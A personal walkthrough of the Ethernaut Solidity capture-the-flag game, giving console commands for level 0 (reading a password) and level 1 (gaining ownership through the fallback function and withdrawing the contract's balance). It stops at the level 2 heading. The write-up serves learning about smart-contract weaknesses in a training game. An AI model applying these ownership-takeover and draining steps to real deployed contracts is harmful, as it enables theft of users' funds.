This is a new walkthrough of the Ethernaut Solidity CTF.

I did it previously but I want to go through it again and write a detailled walkthrough.

# Levels
## Lvl-0 Hello Ethernaut
Follow the instructions in the console until you get to:
`await contract.method7123949()
'If you know the password, submit it to authenticate().'`.
Remember that you can access to the ABI object with 'contract.abi'.
You will see the 'password' method that you can call:
`'await contract.password()
'ethernaut0'`
Then simply call contract.authenticate() with the param 'ethernaut0', pay for the transaction with metamask,
wait for tx to be mined, click the 'submit instance' button and voila!

## Lvl-1 Fallback
To pass this level, you first need to send some eth to it through the contribute() function, then some more eth through the fallback function.
First check that your contribution is 0, with 'await contract.checkContributions()' that returns 0.
Then call 'await contract.contribute({value: 1})' and pay for the tx.
Wait for the tx to be mined then call 'await contract.checkContributions()' again. It should now be 1.
Now you can send eth through the fallback function with
'await web3.eth.sendTransaction({to: instance, from: player, value: 1})'.
Waited for the tx to be mined and check the owner with 'await contract.owner()'
It should be your address.
You can now call the withdraw function and drain the contract of it's balance.
Call 'await web3.eth.getBalance(instance)' to check that balance is 0.
Click 'submit instance'.

## Lvl-2 Fallout